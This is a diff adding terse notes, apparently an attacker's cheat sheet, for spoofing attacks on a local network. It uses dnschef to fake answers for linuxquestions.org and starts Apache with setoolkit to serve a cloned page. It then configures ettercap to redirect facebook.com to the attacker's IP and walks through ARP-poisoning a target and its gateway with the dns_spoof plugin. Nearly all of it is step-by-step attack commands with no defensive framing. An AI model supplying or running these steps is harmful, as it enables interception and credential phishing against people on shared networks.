@@ -1,0 +1,42 @@
+dnschef :
+----------
+	dnschef --fakeip=192.168.1.104 --fakedomains=linuxquestions.org/ --interface=192.168.1.104
+
+	service apache2 start
+	setoolkit
+
+
+ettercap :
+----------
+	1.
+		gedit /etc/ettercap/etter.conf
+		ec_uid = 0
+		ec_gid = 0
+		>> Find: if you use iptables and uncommand two line
+		#redir_command_on ... ...
+		#redir_connamd_off ... ...
+
+
+
+	2.
+		gedit /etc/ettercap/etter.dns
+		>> here set this
+		facebook.com	A	yourIP
+		*.facebook.com	A	yourIP
+
+
+	3.
+		open etter graphycal softer:
+		sniff >> unified snifing >> select network interface
+		start >> stop snifing
+		host >> scan for host
+		host >> host list
+		
+		then select default getway as "Add to target 2" and terget ip is "Add to target 1"
+
+		Mitm >> ARP Poisioning >> Sniff remote connections >> ok
+		Plugins >> select dns_spoof
+		start >> start snifing.
+		
+		
+
